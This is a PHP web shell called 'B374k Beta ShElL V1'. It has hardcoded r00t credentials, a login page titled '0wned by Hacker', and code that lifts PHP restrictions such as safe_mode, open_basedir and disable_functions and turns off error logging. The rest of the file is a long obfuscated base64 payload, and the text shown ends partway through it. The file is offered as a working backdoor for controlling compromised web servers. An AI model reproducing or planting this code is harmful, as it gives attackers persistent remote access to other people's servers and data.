<?
// ###########################################
// #           B374k Beta ShElL V1           #
// #            Cyb3R_ShubhaM                #
// #          www.CyberShubham.com           #
// ###########################################

//Change User & Password

$tacfgd['uname'] = 'r00t';
$tacfgd['pword'] = 'r00t';


// Title of page.
$tacfgd['title'] = '0wned by Hacker';

// Text to appear just above login form.
$tacfgd['helptext'] = 'B374k Beta';


// Set to true to enable the optional remember-me feature, which stores encrypted login details to 
// allow users to be logged-in automatically on their return. Turn off for a little extra security.
$tacfgd['allowrm'] = true;

// If you have multiple protected pages, and there's more than one username / password combination, 
// you need to group each combination under a distinct rmgroup so that the remember-me feature 
// knows which login details to use.
$tacfgd['rmgroup'] = 'default';

// Set to true if you use your own sessions within your protected page, to stop txtAuth interfering. 
// In this case, you _must_ call session_start() before you require() txtAuth. Logging out will not 
// destroy the session, so that is left up to you.
$tacfgd['ownsessions'] = false;




foreach ($tacfgd as $key => $val) {
  if (!isset($tacfg[$key])) $tacfg[$key] = $val;
}

if (!$tacfg['ownsessions']) {
  session_name('txtauth');
  session_start();
}

// Logout attempt made. Deletes any remember-me cookie as well
if (isset($_GET['logout']) || isset($_POST['logout'])) {
  setcookie('txtauth_'.$rmgroup, '', time()-86400*14);
  if (!$tacfg['ownsessions']) {
    $_SESSION = array();
    session_destroy();
  }
  else $_SESSION['txtauthin'] = false;
}
// Login attempt made
elseif (isset($_POST['login'])) {
  if ($_POST['uname'] == $tacfg['uname'] && $_POST['pword'] == $tacfg['pword']) {
    $_SESSION['txtauthin'] = true;
    if ($_POST['rm']) {
      // Set remember-me cookie for 2 weeks
      setcookie('txtauth_'.$rmgroup, md5($tacfg['uname'].$tacfg['pword']), time()+86400*14);
    }
  }
  else $err = 'Login Faild !';
}
// Remember-me cookie exists
elseif (isset($_COOKIE['txtauth_'.$rmgroup])) {
  if (md5($tacfg['uname'].$tacfg['pword']) == $_COOKIE['txtauth_'.$rmgroup] && $tacfg['allowrm']) {
    $_SESSION['txtauthin'] = true;
  }
  else $err = 'Login Faild !';
}
if (!$_SESSION['txtauthin']) {
@ini_restore("safe_mode");
@ini_restore("open_basedir");
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");

@ini_set('error_log',NULL);
@ini_set('log_errors',0);
?>
<html dir=rtl>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
<title><?=$tacfg['title']?></title>

<STYLE>

BODY
 {
        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #666666; SCROLLBAR-3DLIGHT-COLOR: #726456; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
}

tr {
BORDER-RIGHT:  #dadada ;
BORDER-TOP:    #dadada ;
BORDER-LEFT:   #dadada ;
BORDER-BOTTOM: #dadada ;
color: #ffffff;
}
td {
BORDER-RIGHT:  #dadada ;
BORDER-TOP:    #dadada ;
BORDER-LEFT:   #dadada ;
BORDER-BOTTOM: #dadada ;
color: #dadada;
}
.table1 {
BORDER: 1;
BACKGROUND-COLOR: #000000;
color: #333333;
}
.td1 {
BORDER: 1;
font: 7pt tahoma;
color: #ffffff;
}
.tr1 {
BORDER: 1;
color: #dadada;
}
table {
BORDER:  #eeeeee  outset;
BACKGROUND-COLOR: #000000;
color: #dadada;
}
input {
BORDER-RIGHT:  #00FF00 1 solid;
BORDER-TOP:    #00FF00 1 solid;
BORDER-LEFT:  #00FF00 1 solid;
BORDER-BOTTOM: #00FF00 1 solid;
BACKGROUND-COLOR: #333333;
font: 9pt tahoma;
color: #ffffff;
}
select {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #000000;
font: 9pt tahoma;
color: #dadada;;
}
submit {
BORDER:  buttonhighlight 1 outset;
BACKGROUND-COLOR: #272727;
width: 40%;
color: #dadada;
}
textarea {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #333333;
font: Fixedsys bold;
color: #ffffff;
}
BODY {
margin: 1;
color: #dadada;
background-color: #000000;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}

</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>';

<body>
<br><br><div style="font-size: 14pt;" align="center"><?=$tacfg['title']?></div>
<hr width="300" size="1" noshade color="#cdcdcd">
<p>
<div align="center" class="grey">
<?=$tacfg['helptext']?>
</div>
<p>
<?
if (isset($_SERVER['REQUEST_URI'])) $action = $_SERVER['REQUEST_URI'];
else $action = $_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
if (strpos($action, 'logout=1', strpos($action, '?')) !== false) $action = str_replace('logout=1', '', $action);
?>
<form name="txtauth" action="<?=$action?>" method="post">
<div align="center">
<table border="0" cellpadding="4" cellspacing="0" bgcolor="#666666" style="border: 1px double #dedede;" dir="ltr">
<?=(isset($err))?'<tr><td colspan="2" align="center"><font color="red">'.$err.'</font></td></tr>':''?>
<?if (isset($tacfg['uname'])) {?>
<tr><td>Username:</td><td><input type="text" name="uname" value="" size="20" maxlength="100" class="txtbox"></td></tr>
<?}?>
<tr><td>Password:</td><td><input type="password" name="pword" value="" size="20" maxlength="100" class="txtbox"></td></tr>
<?if ($tacfg['allowrm']) {?>
<tr><td align="left"><input type="submit" name="login" value="Login">
</td><td align="right"><input type="checkbox" name="rm" id="rm"><label for="rm"> 
	Remember Me ?</label></td></tr>
<?} else {?>
<tr><td colspan="2" align="center">
	<input type="submit" name="login" value="Login"></td></tr>
<?}?>
</table>
</div>
</form>

<br><br>
<hr width="300" size="1" noshade color="#cdcdcd">
<div class="smalltxt" align="center">Developed by
	<a href="mailto:darkfire.batch@gmail.com">Cyb3R_ShubhaM</a> | copyright ©  
	2010</div>

</body>
</html>
<?
  // Don't delete this!
  exit();
}
?>

<?php

@error_reporting(0);
@set_time_limit(0); 

$code = "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
qx9vZx0dBuWjXuxe9jGbfTcy7sjzxa/7uprlZvb/onHf85tlpuZLZG3fS6jwn9yfj+5bj6/LMH9o
PRmdg3Kf71/qoPD+p7nYuhXy733En23buJotk7s3cO3cbfbv5bBTkvtZ9Htclf94cX4+tvU1vx96
/8QuN8V1z3n3sFLaV2wEaukGmkp/cdi5GA+HuJVdr16znk/l4Wr53tGlBvr/tT93dG9nXLqt2el/
af9k/LlwOnOHtnt0YXFz1xtdqWzu78nqtRmO3UC9njMzOg3M/FM5O2vtnU7eTqW1f6vO7br+6eZV
rjZT+QNcfeo3rqd7y1Z47mNWf+y8n56eZvXJXL88fjuXCpT6+y191nNNaJzfNnm930ZJuWrb08cP
D/lmn5lVfurXNdH/POx7mrpu3F/JJOX3ue9WdqxOzUL073bzS5NrL0LnPnJnT095Lb6gct68MRTp
reneXwqNqn6iNVu147Kj9Sv9e6yPeGbSH4/PNZ/9Cb+6NL23t4aLy0so9mlfN5+3HncHtY7+lX/X
0Xf1lqFhnklut3j+MhrvC6MZvKyPTczNnle2XHdedX+v9zp5XyT9278yXzcuO0ZF2Gv3b57ZkPT7
cNjbv+thLlGd+xzgSHx/PtfZ+fVKtS+lhutx/HhqDVk4qbx7XzPOT46zc3RmetR5P5+2L3O3UMUe
5ifFgn6R77ui43td9JZ8fje9H43HXzQrX5n2zmz3pzvbO6qadyam9ppItXLxkK/VRJ3987XdP57e
P6iC/nTvRpvLDRK6Uz9RKt2JlByeN6kDPzs60y4f7eX8yEPzrlwt15KdnF+fX+t3xtjd80Ab5R1W
+qrYtw+xfXLjzbbtfu9/V8s3H8/zJnXlXk+y2N2/sPU/nNydeprHfUm6qt8MTQU1PvfRg+OBdF05
a2mmmJU+q5+X70/LL6ahvKi857aJWscxRtv48bg6ds12tmq6MJjue3G9L3XKjUy04VzvdK3t0lRE
uW5cXhbOrvDO6cq41Z8/df6x1d7afBzuT++nOw+Pl7d3s4r4znyh394+b7bxuPtidguLtnb9cN6r
GbfvZmt7I+8Om27GFsdTNyzuO1Mrues+P9u5Luzq6vbjL3jXSzZZVOz+VpIFc6/Se79qVF7XxmHv
Rn68vu3P3ZP+mreZz9wU0I8ZXmd7z6bGwqalyv3FbM9rbd/Jla2jWs7L6kO+4zsXVrKB07yqdynG
/bdze7zYms/0j7LMmyUMw1S1V9o/E/mOt2dq/mtTq9/3jtHfTbU1y2p1rvcxuKpmKc5K/aPnjFy1
z33Rkr5q9GNoXtfS93vYr9c6uP9rZ2XzcL8wedrqZli8M/dPjfUnXPMe96Q47xxfewMpK45155Tq
r3556jfF2rScNd52ueT24S5/f3Va2e3mjeZc/bu41ai9yTXP8KyRhc/vPQis30Tojo9I3Ktfj+84
snb7Y7V8q3fpm60ZWh2jitoxpfdq2mookn7SqZau8O3g8bx6fXjlab1LJjy6uJ/tl7b568Sg8S/m
6KRsP0kDbzVqF84teu6yN9qp27zp/29s2n7vp3szNHLcsOX+Sr3YHL+pe/7KRnWjOjol0wKZ/diV
fnzmnd82J0PaGY0cp5DbdqX1RVRzFHT9qg2PVSqtTJIHyVjWX3dbbOwggXZnk0zvP0ot2cVnQazV
ndHEjTeqXnevJ0dJogHa675z1pEF9Wj3L3KfriqY9Xt51a9l+9uGifqwatZf+47mh35m57p7d08/
PLy+7RrqwPcwV3K42q87lzcdc+9lpeapbFo4fZv529rxvKH2/M5Lzyl6z8FIwL+VTtVwd7uzuZrx
OWRrK2drtS+14+mJpw+OOUT8xCjvpfFfazvcd259VysfNwo4wnzvzh/JeRbp62ZlJd5WLbKf84Iy
cvXvp4dG5qWavy2792Dxuzgcdv/Ngn99eyc30cyc/vqhk3fruZNAyr9MWksp7O4K+mcvKzW3H6jx
07yTZ0Mfy1VV6Om6ePGszr3fWmShqprt5kZnMzwo9P//Qb97o1qBidCqWbu5J6cfReSVz3p7082W
hOTzJ9Jubx4X785y5u59/Tt84Nw9nNWnc3c5X5vN5d1ar93v1snasd3Xr+Kxib5fvW2bNmOqjm+N
8NZMe3KvPOhriB+F5Ij8MRvWymju9utafHwvPl9unDy/t1nGhPK6aZ6fPw7SZLWjZyun4xj6rP+y
Usw0t51fz93U125teTPb2Htozf7edqwm7/cLktHozRUNWG453Gi/utl/duXyoWvas3j+ZKGfy/UV
WN9x+Wbnr3dxcEq74uSQcar5plA7Boal06Ou+oZYODohrmGBmraxw+LOjOfQW2Rj2plGhg4PDNIE
VDsnWGNmlxDt16XDDTCzxS2XYOzOQCZ3sSe4ImVWKLY/gLhtsAVYNFR6PZ3UFw2yk8OZfCq6/GdI
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
